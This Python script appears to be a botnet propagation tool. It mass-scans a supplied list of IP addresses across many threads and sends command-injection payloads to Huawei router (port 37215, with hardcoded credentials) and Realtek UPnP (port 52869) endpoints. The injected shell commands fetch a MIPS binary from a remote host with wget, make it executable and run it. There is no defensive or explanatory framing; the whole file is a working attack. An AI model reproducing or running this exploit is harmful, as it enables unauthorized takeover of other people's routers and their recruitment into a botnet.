import sys, os, re
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *

ips = open(sys.argv[1], "r").readlines()
motherthreads = int(sys.argv[2]) #2-1000
motherthread_count = len(ips) / motherthreads
motherthread_chunks = [ips[x:x+motherthread_count] for x in xrange(0, len(ips), motherthread_count)]

cmd = "cd /tmp;/bin/busybox wget -g IP -l /tmp/MIPS -r /MIPS; chmod 777 /tmp/MIPS; ./tmp/MIPS"
payload2 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"

p = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://IP/2qWq45 -O- >MIPS`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
pp = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`chmod 777 /var/MIPS`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
ppp = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;./MIPS S &`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"

headerlist = {'SOAPAction': 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'}

def dump(count):
	count = int(count)
	for i in motherthread_chunks[count]:
		try:
			url = "http://"+i+":37215/ctrlt/DeviceUpgrade_1"
			url2 = "http://"+i+":52869/simplecfg.xml"
			url = re.sub('\n', '', url)
			url2 = re.sub('\n', '', url2)
			requests.post(url, timeout=8, data=payload2, auth=HTTPDigestAuth('dslf-config', 'admin'))
			requests.post(url2, timeout=8, headers=headerlist, data=p)
			requests.post(url2, timeout=8, headers=headerlist, data=pp)
			requests.post(url2, timeout=5, headers=headerlist, data=ppp)
			print "PAYLOAD SENT %s"%(url)
			motherthread_chunks[count] = motherthread_chunks[count].remove(i)
			time.sleep(0.001)
		except:
			pass

for x in xrange(motherthreads):
	try:
		thread = Thread(target=dump, args=(x,))
		thread.start()
	except KeyboardInterrupt:
		sys.exit("STOPPING!")
	except:
		pass